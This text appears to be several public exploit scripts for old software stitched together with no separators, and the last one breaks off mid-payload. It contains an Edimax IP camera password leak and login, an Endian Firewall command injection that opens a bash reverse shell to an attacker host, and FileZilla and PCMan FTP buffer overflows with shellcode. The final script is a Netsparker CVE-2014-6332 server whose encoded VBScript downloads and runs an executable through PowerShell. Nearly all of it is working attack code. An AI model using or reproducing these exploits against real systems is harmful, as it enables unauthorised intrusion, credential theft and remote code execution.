# Bug found by: Ben Schmidt for RXS-3211 IP camera http://www.securityfocus.com/archive/1/518123
# To successfully automate your browser launch, change browser path.
"""

import socket
import webbrowser
import sys

if len(sys.argv) != 2:
    print "Eg: ./edimaxpwned.py edimax-IP"
    sys.exit(1)

port=13364
target= sys.argv[1]


def read_pw(target, port):
    devmac = "\xff\xff\xff\xff\xff\xff"
    code="\x00\x06\xff\xf9" #for unicast reply
    data=devmac+code
    sock =socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sock.connect((target,port))
    try:
        sock.send(data)
        sock.settimeout(5)
        tmp = sock.recv(4096)
        return tmp
    except socket.timeout:
        return None

def pwned_edi():
    data=read_pw(target, port)
    if data != None:
        data=data[365:377]
        pw=data.strip("\x00")
        webbrowser.get("/Applications/Firefox.app/Contents/MacOS/firefox-bin %s" ).open('http://admin:'+pw+'@'+target+'/index.asp')
    else:
        print "Socket timeOut or not Vulnerable"

pwned_edi()
#!/usr/bin/env python

# Endian Firewall Proxy User Password Change (/cgi-bin/chpasswd.cgi)
# OS Command Injection Exploit POC (Reverse TCP Shell)
# Ben Lincoln, 2015-06-28
# http://www.beneaththewaves.net/
# Requires knowledge of a valid proxy username and password on the target Endian Firewall

import httplib
import sys

proxyUserPasswordChangeURI = "/cgi-bin/chpasswd.cgi"

def main():
	if len(sys.argv) < 7:
		print "Endian Firewall Proxy User Password Change (/cgi-bin/chpasswd.cgi) Exploit\r\n"
		print "Usage: " + sys.argv[0] + " [TARGET_SYSTEM_IP] [TARGET_SYSTEM_WEB_PORT] [PROXY_USER_NAME] [PROXY_USER_PASSWORD] [REVERSE_SHELL_IP] [REVERSE_SHELL_PORT]\r\n"
		print "Example: " + sys.argv[0] + " 172.16.97.1 10443 proxyuser password123 172.16.97.17 443\r\n"
		print "Be sure you've started a TCP listener on the specified IP and port to receive the reverse shell when it connects.\r\n"
		print "E.g. ncat -nvlp 443"
		sys.exit(1)

	multipartDelimiter = "---------------------------334002631541493081770656718"
	
	targetIP = sys.argv[1]
	targetPort = sys.argv[2]
	userName = sys.argv[3]
	password = sys.argv[4]
	reverseShellIP = sys.argv[5]
	reverseShellPort = sys.argv[6]

	exploitString = password + "; /bin/bash -c /bin/bash -i >& /dev/tcp/" + reverseShellIP + "/" + reverseShellPort + " 0>&1;"

	endianURL = "https://" + targetIP + ":" + targetPort + proxyUserPasswordChangeURI

	conn = httplib.HTTPSConnection(targetIP, targetPort)
	headers = {}
	headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
	headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	headers["Accept-Encoding"] = ""
	headers["Referer"] = "https://" + targetIP + ":" + targetPort + proxyUserPasswordChangeURI
	headers["Content-Type"] = "multipart/form-data; boundary=" + multipartDelimiter
	headers["Accept-Language"] = "en-US,en;q=0.5"
	headers["Connection"] = "keep-alive"

	multipartDelimiter = "--" + multipartDelimiter

	body = multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"ACTION\"\r\n\r\n"
	body = body + "change\r\n"
	body = body + multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"USERNAME\"\r\n\r\n"
	body = body + userName + "\r\n"
	body = body + multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"OLD_PASSWORD\"\r\n\r\n"
	body = body + password + "\r\n"
	body = body + multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"NEW_PASSWORD_1\"\r\n\r\n"
	body = body + exploitString + "\r\n"
	body = body + multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"NEW_PASSWORD_2\"\r\n\r\n"
	body = body + exploitString + "\r\n"
	body = body + multipartDelimiter + "\r\n"
	body = body + "Content-Disposition: form-data; name=\"SUBMIT\"\r\n\r\n"
	body = body + "  Change password\r\n"
	body = body + multipartDelimiter + "--" + "\r\n"

	conn.request("POST", proxyUserPasswordChangeURI, body, headers)
	response = conn.getresponse()
	print "HTTP " + str(response.status) + " " + response.reason + "\r\n"
	print response.read()
	print "\r\n\r\n"

if __name__ == "__main__":
    main()# Exploit Title: Filezilla client 2.2.X SEH buffer overflow exploit
# Date: 02/08/2015
# Exploit Author: ly0n
# Vendor Homepage: filezilla-project.org/
# Software Link: http://www.oldapps.com/filezilla.php?app=7cdf14e88e9dfa85fb661c1c6e649e90
# Version: tested on filezilla 2.2.21
# Tested on: Windows XP sp3 english


#!/usr/bin/env python2
# coding: utf-8
import os,socket,threading,time
#import traceback

# visit: ly0n.me
# greetz: NBS

#MSGBOX "BrokenByte" 
msgbox = ("\x68\x6e\x33\x72\x00\x68\x75\x74"
"\x69\x30\x68\x5e\x58\x65\x63\x89"
"\xe3\x68\x20\x20\x20\x00\x68\x68"
"\x65\x72\x65\x68\x77\x61\x73\x20"
"\x68\x6e\x33\x72\x20\x68\x75\x74"
"\x69\x30\x68\x5e\x58\x65\x63\x89"
"\xe1\x31\xc0\x50\x53\x51\x50\x50"
"\xbe\xea\x07\x45\x7e\xff\xe6\x31"
"\xc0\x50\xb8\x12\xcb\x81\x7c\xff"
"\xe0")

nops = "\x90" * 100
#77EA9CAC    POP POP RET kernel32.dll <- seh
#EB069090    SHORT JUMP 6 POS + 2 NOPS  <- nseh
nseh = "\xeb\x06\x90\x90"
seh = "\xAC\x9C\xEA\x77" 

allow_delete = False
local_ip = "192.168.11.6" #SERVER LOCAL IP
local_port = 21 #DESIRED PORT

buffer1 = "\x41" * 1896 + nseh  + seh + nops + msgbox + nops
buffer = buffer1 + ".txt"
currdir=os.path.abspath('.')
 
class FTPserverThread(threading.Thread):
    def __init__(self,(conn,addr)):
        self.conn=conn
        self.addr=addr
        self.basewd=currdir
        self.cwd=self.basewd
        self.rest=False
        self.pasv_mode=False
        threading.Thread.__init__(self)
 
    def run(self):
        self.conn.send('220 Welcome!\r\n')
        while True:
            cmd=self.conn.recv(256)
            if not cmd: break
            else:
                print 'Recieved:',cmd
                try:
                    func=getattr(self,cmd[:4].strip().upper())
                    func(cmd)
                except Exception,e:
                    print 'ERROR:',e
                    #traceback.print_exc()
                    self.conn.send('500 Sorry.\r\n')
 
    def SYST(self,cmd):
        self.conn.send('215 UNIX Type: L8\r\n')
    def OPTS(self,cmd):
        if cmd[5:-2].upper()=='UTF8 ON':
            self.conn.send('200 OK.\r\n')
        else:
            self.conn.send('451 Sorry.\r\n')
    def USER(self,cmd):
        self.conn.send('331 OK.\r\n')
    def PASS(self,cmd):
        self.conn.send('230 OK.\r\n')
        #self.conn.send('530 Incorrect.\r\n')
    def QUIT(self,cmd):
        self.conn.send('221 Goodbye.\r\n')
    def NOOP(self,cmd):
        self.conn.send('200 OK.\r\n')
    def TYPE(self,cmd):
        self.mode=cmd[5]
        self.conn.send('200 Binary mode.\r\n')
 
    def CDUP(self,cmd):
        if not os.path.samefile(self.cwd,self.basewd):
            #learn from stackoverflow
            self.cwd=os.path.abspath(os.path.join(self.cwd,'..'))
        self.conn.send('200 OK.\r\n')
    def PWD(self,cmd):
        cwd=os.path.relpath(self.cwd,self.basewd)
        if cwd=='.':
            cwd='/'
        else:
            cwd='/'+cwd
        self.conn.send('257 \"%s\"\r\n' % cwd)
    def CWD(self,cmd):
        chwd=cmd[4:-2]
        if chwd=='/':
            self.cwd=self.basewd
        elif chwd[0]=='/':
            self.cwd=os.path.join(self.basewd,chwd[1:])
        else:
            self.cwd=os.path.join(self.cwd,chwd)
        self.conn.send('250 OK.\r\n')
 
    def PORT(self,cmd):
        if self.pasv_mode:
            self.servsock.close()
            self.pasv_mode = False
        l=cmd[5:].split(',')
        self.dataAddr='.'.join(l[:4])
        self.dataPort=(int(l[4])<<8)+int(l[5])
        self.conn.send('200 Get port.\r\n')
 
    def PASV(self,cmd): # from http://goo.gl/3if2U
        self.pasv_mode = True
        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.servsock.bind((local_ip,0))
        self.servsock.listen(1)
        ip, port = self.servsock.getsockname()
        print 'open', ip, port
        self.conn.send('227 Entering Passive Mode (%s,%u,%u).\r\n' %
                (','.join(ip.split('.')), port>>8&0xFF, port&0xFF))
 
    def start_datasock(self):
        if self.pasv_mode:
            self.datasock, addr = self.servsock.accept()
            print 'connect:', addr
        else:
            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.datasock.connect((self.dataAddr,self.dataPort))
 
    def stop_datasock(self):
        self.datasock.close()
        if self.pasv_mode:
            self.servsock.close()
 
 
    def LIST(self,cmd):
        self.conn.send('150 Here comes the directory listing.\r\n')
        print 'list:', self.cwd
        self.start_datasock()
	dirlist = "drwxrwxrwx    1 100      0           11111 Jun 11 21:10" +buffer1+"\r\n\n"
	dirlist += "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22  "+buffer+" \r\n\n"
	self.datasock.send("total 2\r\n"+dirlist)
        self.stop_datasock()
        self.conn.send('226 Directory send OK.\r\n')
 
    def toListItem(self,fn):
        st=os.stat(fn)
        fullmode='rwxrwxrwx'
        mode=''
        for i in range(9):
            mode+=((st.st_mode>>(8-i))&1) and fullmode[i] or '-'
        d=(os.path.isdir(fn)) and 'd' or '-'
        ftime=time.strftime(' %b %d %H:%M ', time.gmtime(st.st_mtime))
        return d+mode+' 1 user group '+str(st.st_size)+ftime+os.path.basename(fn)
 
    def MKD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        os.mkdir(dn)
        self.conn.send('257 Directory created.\r\n')
 
    def RMD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        if allow_delete:
            os.rmdir(dn)
            self.conn.send('250 Directory deleted.\r\n')
        else:
            self.conn.send('450 Not allowed.\r\n')
 
    def DELE(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        if allow_delete:
            os.remove(fn)
            self.conn.send('250 File deleted.\r\n')
        else:
            self.conn.send('450 Not allowed.\r\n')
 
    def RNFR(self,cmd):
        self.rnfn=os.path.join(self.cwd,cmd[5:-2])
        self.conn.send('350 Ready.\r\n')
 
    def RNTO(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        os.rename(self.rnfn,fn)
        self.conn.send('250 File renamed.\r\n')
 
    def REST(self,cmd):
        self.pos=int(cmd[5:-2])
        self.rest=True
        self.conn.send('250 File position reseted.\r\n')
 
    def RETR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        #fn=os.path.join(self.cwd,cmd[5:-2]).lstrip('/')
        print 'Downlowding:',fn
        if self.mode=='I':
            fi=open(fn,'rb')
        else:
            fi=open(fn,'r')
        self.conn.send('150 Opening data connection.\r\n')
        if self.rest:
            fi.seek(self.pos)
            self.rest=False
        data= fi.read(1024)
        self.start_datasock()
        while data:
            self.datasock.send(data)
            data=fi.read(1024)
        fi.close()
        self.stop_datasock()
        self.conn.send('226 Transfer complete.\r\n')
 
    def STOR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        print 'Uplaoding:',fn
        if self.mode=='I':
            fo=open(fn,'wb')
        else:
            fo=open(fn,'w')
        self.conn.send('150 Opening data connection.\r\n')
        self.start_datasock()
        while True:
            data=self.datasock.recv(1024)
            if not data: break
            fo.write(data)
        fo.close()
        self.stop_datasock()
        self.conn.send('226 Transfer complete.\r\n')
 
class FTPserver(threading.Thread):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((local_ip,local_port))
        threading.Thread.__init__(self)
 
    def run(self):
        self.sock.listen(5)
        while True:
            th=FTPserverThread(self.sock.accept())
            th.daemon=True
            th.start()
 
    def stop(self):
        self.sock.close()
 
if __name__=='__main__':
    ftp=FTPserver()
    ftp.daemon=True
    ftp.start()
    print 'On', local_ip, ':', local_port
    raw_input('Enter to end...\n')
    ftp.stop()

#!/usr/bin/python
# title: PCMan FTP Server v2.0.7 Buffer Overflow - PUT Command
# author: @shipcod3 (Jay Turla)
# nc <host> 9988
# Tested on Windows XP Service Pack 3 - English
# description: Buffer overflow is triggered upon sending long string using the command PUT to PCMAN FTP 2.07 
 
import socket
import sys

# msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -b '\x00\x0A\x0D' -t c
shellcode = (
"\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
"\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
"\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86"
"\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11"
"\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e"
"\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc"
"\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4"
"\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f"
"\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a"
"\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74"
"\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02"
"\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43"
"\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad"
"\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f"
"\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b"
"\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54"
"\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02"
"\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d"
"\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44"
"\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87"
"\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74"
"\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26"
"\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"
"\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92")


buffer = "\x90" * 30 + shellcode 
#77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll]
evil = "A"*2008 + "\x59\x54\xC3\x77" + buffer + "C"*(888-len(buffer))
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((raw_input('Enter Host:'),21))
 
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('PUT ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
#!/usr/bin/python
# Title : Netsparker 2.3.X - Remote Code Execution
# Tested on Netsparker 2.3.x / Win 7
#
#
# Author      :   Hesam Bazvand
# E-Mail      :   black.king066@gmail.com
# FaceBook    :   https://www.facebook.com/hesam.king73
# Twitter     :   https://twitter.com/hesam_king73
#
#
# Exploit MS14-064 CVE2014-6332
#
#
# 1 . run python code : python netsparker.py
# 2 . run netsparker
# 3 . "Start a New Scan"
# 4 . Enter your exploit link http://ipaddress:80/ in Target URL
# 5 . goto to "Authentication" Menu
# 6 . select "Form Authentication"
# 7 . Click "Next >"
# 10 . Your Link Download/Execute on your target ;)
# 11 . Finished ;)

import socket

HOST, PORT = '', 80

listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listen_socket.bind((HOST, PORT))
listen_socket.listen(1)
print 'Serving HTTP on port %s ...' % PORT
while True:
    client_connection, client_address = listen_socket.accept()
    request = client_connection.recv(1024)
    print request
    hesam=("\x3c\x68\x74\x6d\x6c\x3e\x0d\x0a\x3c\x6d\x65\x74\x61\x20\x68\x74\x74\x70\x2d\x65\x71\x75\x69\x76"
           "\x3d\x22\x58\x2d\x55\x41\x2d\x43\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x22\x20\x63\x6f\x6e\x74\x65"
           "\x6e\x74\x3d\x22\x49\x45\x3d\x45\x6d\x75\x6c\x61\x74\x65\x49\x45\x38\x22\x20\x3e\x0d\x0a\x3c\x68"
           "\x65\x61\x64\x3e\x0d\x0a\x3c\x2f\x68\x65\x61\x64\x3e\x0d\x0a\x3c\x62\x6f\x64\x79\x3e\x0d\x0a\x20"
           "\x0d\x0a\x3c\x53\x43\x52\x49\x50\x54\x20\x4c\x41\x4e\x47\x55\x41\x47\x45\x3d\x22\x56\x42\x53\x63"
           "\x72\x69\x70\x74\x22\x3e\x0d\x0a\x0d\x0a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x72\x75\x6e\x6d\x75"
           "\x6d\x61\x61\x28\x29\x20\x0d\x0a\x4f\x6e\x20\x45\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20"
           "\x4e\x65\x78\x74\x0d\x0a\x73\x65\x74\x20\x73\x68\x65\x6c\x6c\x3d\x63\x72\x65\x61\x74\x65\x6f\x62"
           "\x6a\x65\x63\x74\x28\x22\x53\x68\x65\x6c\x6c\x2e\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x22"
           "\x29\x0d\x0a\x63\x6f\x6d\x6d\x61\x6e\x64\x3d\x22\x49\x6e\x76\x6f\x6b\x65\x2d\x45\x78\x70\x72\x65"
           "\x73\x73\x69\x6f\x6e\x20\x24\x28\x4e\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65"
           "\x6d\x2e\x4e\x65\x74\x2e\x57\x65\x62\x43\x6c\x69\x65\x6e\x74\x29\x2e\x44\x6f\x77\x6e\x6c\x6f\x61"
           "\x64\x46\x69\x6c\x65\x28\x27\x46\x49\x4c\x45\x5f\x44\x4f\x57\x4e\x4c\x4f\x41\x44\x27\x2c\x27\x6c"
           "\x6f\x61\x64\x2e\x65\x78\x65\x27\x29\x3b\x24\x28\x4e\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x2d"
           "\x63\x6f\x6d\x20\x53\x68\x65\x6c\x6c\x2e\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x29\x2e\x53"
           "\x68\x65\x6c\x6c\x45\x78\x65\x63\x75\x74\x65\x28\x27\x6c\x6f\x61\x64\x2e\x65\x78\x65\x27\x29\x3b"
           "\x22\x0d\x0a\x73\x68\x65\x6c\x6c\x2e\x53\x68\x65\x6c\x6c\x45\x78\x65\x63\x75\x74\x65\x20\x22\x70"
           "\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65\x22\x2c\x20\x22\x2d\x43\x6f\x6d\x6d\x61\x6e"
           "\x64\x20\x22\x20\x26\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x2c\x20\x22\x22\x2c\x20\x22\x72\x75\x6e\x61"
           "\x73\x22\x2c\x20\x30\x0d\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x3c\x2f\x73"
           "\x63\x72\x69\x70\x74\x3e\x0d\x0a\x20\x0d\x0a\x3c\x53\x43\x52\x49\x50\x54\x20\x4c\x41\x4e\x47\x55"
           "\x41\x47\x45\x3d\x22\x56\x42\x53\x63\x72\x69\x70\x74\x22\x3e\x0d\x0a\x20\x20\x0d\x0a\x64\x69\x6d"
           "\x20\x20\x20\x61\x61\x28\x29\x0d\x0a\x64\x69\x6d\x20\x20\x20\x61\x62\x28\x29\x0d\x0a\x64\x69\x6d"
           "\x20\x20\x20\x61\x30\x0d\x0a\x64\x69\x6d\x20\x20\x20\x61\x31\x0d\x0a\x64\x69\x6d\x20\x20\x20\x61"
           "\x32\x0d\x0a\x64\x69\x6d\x20\x20\x20\x61\x33\x0d\x0a\x64\x69\x6d\x20\x20\x20\x77\x69\x6e\x39\x78"
           "\x0d\x0a\x64\x69\x6d\x20\x20\x20\x69\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x0d\x0a\x64\x69\x6d\x20"
           "\x20\x20\x72\x6e\x64\x61\x0d\x0a\x64\x69\x6d\x20\x20\x20\x66\x75\x6e\x63\x6c\x61\x73\x73\x0d\x0a"
           "\x64\x69\x6d\x20\x20\x20\x6d\x79\x61\x72\x72\x61\x79\x0d\x0a\x20\x0d\x0a\x42\x65\x67\x69\x6e\x28"
           "\x29\x0d\x0a\x20\x0d\x0a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x42\x65\x67\x69\x6e\x28\x29\x0d\x0a"
           "\x20\x20\x4f\x6e\x20\x45\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65\x78\x74\x0d\x0a"
           "\x20\x20\x69\x6e\x66\x6f\x3d\x4e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x55\x73\x65\x72\x41\x67\x65"
           "\x6e\x74\x0d\x0a\x20\x0d\x0a\x20\x20\x69\x66\x28\x69\x6e\x73\x74\x72\x28\x69\x6e\x66\x6f\x2c\x22"
           "\x57\x69\x6e\x36\x34\x22\x29\x3e\x30\x29\x20\x20\x20\x74\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20"
           "\x65\x78\x69\x74\x20\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20\x20\x65\x6e\x64\x20\x69"
           "\x66\x0d\x0a\x20\x0d\x0a\x20\x20\x69\x66\x20\x28\x69\x6e\x73\x74\x72\x28\x69\x6e\x66\x6f\x2c\x22"
           "\x4d\x53\x49\x45\x22\x29\x3e\x30\x29\x20\x20\x20\x74\x68\x65\x6e\x20\x0d\x0a\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x69\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x20\x3d\x20\x43\x49\x6e"
           "\x74\x28\x4d\x69\x64\x28\x69\x6e\x66\x6f\x2c\x20\x49\x6e\x53\x74\x72\x28\x69\x6e\x66\x6f\x2c\x20"
           "\x22\x4d\x53\x49\x45\x22\x29\x20\x2b\x20\x35\x2c\x20\x32\x29\x29\x20\x20\x20\x0d\x0a\x20\x20\x65"
           "\x6c\x73\x65\x0d\x0a\x20\x20\x20\x20\x20\x65\x78\x69\x74\x20\x20\x20\x66\x75\x6e\x63\x74\x69\x6f"
           "\x6e\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x65"
           "\x6e\x64\x20\x69\x66\x0d\x0a\x20\x0d\x0a\x20\x20\x77\x69\x6e\x39\x78\x3d\x30\x0d\x0a\x20\x0d\x0a"
           "\x20\x20\x42\x65\x67\x69\x6e\x49\x6e\x69\x74\x28\x29\x0d\x0a\x20\x20\x49\x66\x20\x43\x72\x65\x61"
           "\x74\x65\x28\x29\x3d\x54\x72\x75\x65\x20\x54\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x6d\x79\x61"
           "\x72\x72\x61\x79\x3d\x20\x20\x20\x20\x20\x20\x20\x20\x63\x68\x72\x77\x28\x30\x31\x29\x26\x63\x68"
           "\x72\x77\x28\x32\x31\x37\x36\x29\x26\x63\x68\x72\x77\x28\x30\x31\x29\x26\x63\x68\x72\x77\x28\x30"
           "\x30\x29\x26\x63\x68\x72\x77\x28\x30\x30\x29\x26\x63\x68\x72\x77\x28\x30\x30\x29\x26\x63\x68\x72"
           "\x77\x28\x30\x30\x29\x26\x63\x68\x72\x77\x28\x30\x30\x29\x0d\x0a\x20\x20\x20\x20\x20\x6d\x79\x61"
           "\x72\x72\x61\x79\x3d\x6d\x79\x61\x72\x72\x61\x79\x26\x63\x68\x72\x77\x28\x30\x30\x29\x26\x63\x68"
           "\x72\x77\x28\x33\x32\x37\x36\x37\x29\x26\x63\x68\x72\x77\x28\x30\x30\x29\x26\x63\x68\x72\x77\x28"
           "\x30\x29\x0d\x0a\x20\x0d\x0a\x20\x20\x20\x20\x20\x69\x66\x28\x69\x6e\x74\x56\x65\x72\x73\x69\x6f"
           "\x6e\x3c\x34\x29\x20\x74\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x64\x6f\x63\x75"
           "\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x22\x3c\x62\x72\x3e\x20\x49\x45\x22\x29\x0d\x0a\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x69"
           "\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x29\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x75\x6e"
           "\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x28\x29\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x65\x6c\x73\x65\x20\x20\x0d\x0a\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x74\x6e\x6f\x74\x73\x61\x66\x65\x6d\x6f\x64\x65\x28\x29"
           "\x0d\x0a\x20\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x0d\x0a\x20\x20\x65\x6e\x64\x20\x69\x66\x0d"
           "\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20\x0d\x0a\x66\x75\x6e\x63\x74\x69"
           "\x6f\x6e\x20\x42\x65\x67\x69\x6e\x49\x6e\x69\x74\x28\x29\x0d\x0a\x20\x20\x20\x52\x61\x6e\x64\x6f"
           "\x6d\x69\x7a\x65\x28\x29\x0d\x0a\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x61\x61\x28\x35\x29\x0d\x0a"
           "\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x61\x62\x28\x35\x29\x0d\x0a\x20\x20\x20\x61\x30\x3d\x31\x33"
           "\x2b\x31\x37\x2a\x72\x6e\x64\x28\x36\x29\x0d\x0a\x20\x20\x20\x61\x33\x3d\x37\x2b\x33\x2a\x72\x6e"
           "\x64\x28\x35\x29\x0d\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20\x0d\x0a\x66"
           "\x75\x6e\x63\x74\x69\x6f\x6e\x20\x43\x72\x65\x61\x74\x65\x28\x29\x0d\x0a\x20\x20\x4f\x6e\x20\x45"
           "\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65\x78\x74\x0d\x0a\x20\x20\x64\x69\x6d\x20"
           "\x69\x0d\x0a\x20\x20\x43\x72\x65\x61\x74\x65\x3d\x46\x61\x6c\x73\x65\x0d\x0a\x20\x20\x46\x6f\x72"
           "\x20\x69\x20\x3d\x20\x30\x20\x54\x6f\x20\x34\x30\x30\x0d\x0a\x20\x20\x20\x20\x49\x66\x20\x4f\x76"
           "\x65\x72\x28\x29\x3d\x54\x72\x75\x65\x20\x54\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x43"
           "\x72\x65\x61\x74\x65\x3d\x54\x72\x75\x65\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x45\x78\x69\x74\x20"
           "\x46\x6f\x72\x0d\x0a\x20\x20\x20\x20\x45\x6e\x64\x20\x49\x66\x20\x0d\x0a\x20\x20\x4e\x65\x78\x74"
           "\x0d\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20\x0d\x0a\x73\x75\x62\x20\x74"
           "\x65\x73\x74\x61\x61\x28\x29\x0d\x0a\x65\x6e\x64\x20\x73\x75\x62\x0d\x0a\x20\x0d\x0a\x66\x75\x6e"
           "\x63\x74\x69\x6f\x6e\x20\x6d\x79\x64\x61\x74\x61\x28\x29\x0d\x0a\x20\x20\x20\x20\x4f\x6e\x20\x45"
           "\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65\x78\x74\x0d\x0a\x20\x20\x20\x20\x20\x69"
           "\x3d\x74\x65\x73\x74\x61\x61\x0d\x0a\x20\x20\x20\x20\x20\x69\x3d\x6e\x75\x6c\x6c\x0d\x0a\x20\x20"
           "\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x32"
           "\x29\x20\x20\x0d\x0a\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x61\x62\x28\x30\x29\x3d\x30\x0d\x0a"
           "\x20\x20\x20\x20\x20\x61\x61\x28\x61\x31\x29\x3d\x69\x0d\x0a\x20\x20\x20\x20\x20\x61\x62\x28\x30"
